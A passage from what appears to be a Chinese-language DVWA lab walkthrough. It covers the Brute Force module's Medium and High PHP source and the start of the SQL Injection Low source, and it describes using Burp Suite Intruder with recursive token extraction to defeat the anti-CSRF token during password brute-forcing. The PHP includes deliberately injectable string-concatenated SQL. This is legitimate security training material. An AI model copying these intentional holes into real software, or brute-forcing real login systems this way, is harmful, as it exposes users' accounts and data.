data-num=\"20\"></td><td><pre>\t\t<span class=\"token variable\">$avatar</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"avatar\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token comment\">// Login successful</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;p>Welcome to the password protected area <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">&#125;</span></span>&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;img src=\\\"<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$avatar</span><span class=\"token punctuation\">&#125;</span></span>\\\" />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token comment\">// Login failed</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;pre>&lt;br />Username and/or password incorrect.&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_null</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$___mysqli_res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这里注意到输入的用户名和密码被 <code>mysqli_real_escape_string</code>  函数过滤了一下，（ <code>mysqli_real_escape_string() </code> 函数转义在 SQL 语句中使用的字符串中的特殊字符）</p>\n<p>但是没有影响进行爆破（只不过在登录失败后 else 语句内有个 <code>sleep(2)</code>  会延缓我们的爆破时间）</p>\n<p>仍然通过爆破：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/WO8%250A_L1HP_8%7EH%7E8%28OC93P.png\" alt=\"\" /></p>\n<p>登录即可</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/WO8%250A_L1HP_8%7EH%7E8%28OC93P.png\" alt=\"\" /></p>\n<h2 id=\"3等级high\"><a class=\"anchor\" href=\"#3等级high\">#</a> 3. 等级： <code>High</code></h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Login'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// Check Anti-CSRF token</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token function\">checkToken</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'user_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'session_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'index.php'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token comment\">// Sanitise username input</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'username'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$user</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$user</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token comment\">// Sanitise password input</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token comment\">// Check database</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM `users` WHERE user = '<span class=\"token interpolation\"><span class=\"token variable\">$user</span></span>' AND password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>';\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token comment\">// Get users details</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token variable\">$row</span>    <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token variable\">$avatar</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"avatar\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token comment\">// Login successful</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;p>Welcome to the password protected area <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">&#125;</span></span>&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;img src=\\\"<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$avatar</span><span class=\"token punctuation\">&#125;</span></span>\\\" />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t<span class=\"token comment\">// Login failed</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;pre>&lt;br />Username and/or password incorrect.&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_null</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$___mysqli_res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">// Generate Anti-CSRF token</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token function\">generateSessionToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这里发现加了一行 <code>checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );</code></p>\n<h3 id=\"checktoken函数\"><a class=\"anchor\" href=\"#checktoken函数\">#</a> checkToken 函数</h3>\n<p>主要用于防范  <code>CSRF</code>  攻击，其原理是通过比较用户提交的 token 值和后端存储的 token 值是否一致来判断请求是否合法，所以不能和上面一样进行直接的爆破</p>\n<p>下面的图可以看到，新加入了 <code>token</code></p>\n<h3 id=\"利用burp爆破\"><a class=\"anchor\" href=\"#利用burp爆破\">#</a> 利用 burp 爆破：</h3>\n<p>爆破方式选择 <code>Potchfork</code> :</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/IR3O7K%403%7EJZY%248%253%40G3E0TI.png\" alt=\"\" /></p>\n<p>进行 302 重定向：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/G1J%5B%25%60V%5DQ%7E%7EBE3VZI%7DF%5BT10.png\" alt=\"\" /></p>\n<p>设置 payload2 为递归搜索</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/K%40F%7ED_%25%7DI4%7E%5D%60WU76L1GT%24I.png\" alt=\"\" /></p>\n<p><code>Grep - Extract</code>  添加一个 <code>Grep</code>  查询筛选， 接着点击获取返回包值，然后鼠标选择要提取的 <code> token</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/YI1IOG%7E%5DNI5KF2RBZUQA%24%40M.png\" alt=\"\" /></p>\n<p>运行：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/A%7DBR7EVI%246%40QNWN%7EA4S_%5DAJ.png\" alt=\"\" /></p>\n<p>提示不能进行多线程，所以改为单线程递归：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/%282KT89L%24Y0%7B%25OK%28D%28R%7BE9ZG.png\" alt=\"\" /></p>\n<p>爆破结果：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/ZC0%60_PM%5D7LIQ%7B%28RHFK72NNU.png\" alt=\"\" /></p>\n<h1 id=\"2sql-injection\"><a class=\"anchor\" href=\"#2sql-injection\">#</a> 2.SQL Injection</h1>\n<h2 id=\"1等级low-2\"><a class=\"anchor\" href=\"#1等级low-2\">#</a> 1. 等级： <code>Low</code></h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Submit'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// Get input</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'id'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_DVWA</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SQLI_DB'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> <span class=\"token constant\">MYSQL</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t<span class=\"token comment\">// Check database</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT first_name, last_name FROM users WHERE user_id = '<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>';\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t<span class=\"token comment\">// Get results</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// Get values</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$first</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"first_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$last</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"last_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// Feedback for end user</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;pre>ID: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">&#125;</span></span>&lt;br />First name: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$first</span><span class=\"token punctuation\">&#125;</span></span>&lt;br />Surname: <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$last</span><span class=\"token punctuation\">&#125;</span></span>&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t<span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> <span class=\"token constant\">SQLITE</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\t<span class=\"token keyword\">global</span> <span class=\"token variable\">$sqlite_db_connection</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\t<span class=\"token comment\">#$sqlite_db_connection = new SQLite3($_DVWA['SQLITE_DB']);</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t<span class=\"token comment\">#$sqlite_db_connection->enableExceptions(true);</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT first_name, last_name FROM users WHERE user_id = '<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>';\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\t<span class=\"token comment\">#print $query;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\t<span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\t\t<span class=\"token variable\">$results</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$sqlite_db_connection</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">echo</span> <span 